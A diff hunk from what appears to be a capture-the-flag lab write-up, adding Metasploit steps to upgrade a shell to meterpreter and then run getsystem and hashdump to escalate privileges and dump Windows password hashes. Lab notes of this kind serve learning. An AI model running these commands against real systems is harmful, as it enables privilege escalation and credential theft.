@@ -122,8 +122,15 @@ meterpreter > getsystem
 Already meterpreter shell else upgrade shell with
 `sessions -u -1`
 Or
+```shell
+use post/multi/manage/shell_to_meterpreter
+show options
+set session 1
+exploit
+```
 
 ```shell
+meterpreter > getsystem
 meterpreter > hashdump
 ```
 -> 3 User: Administrator, Guest, Jon
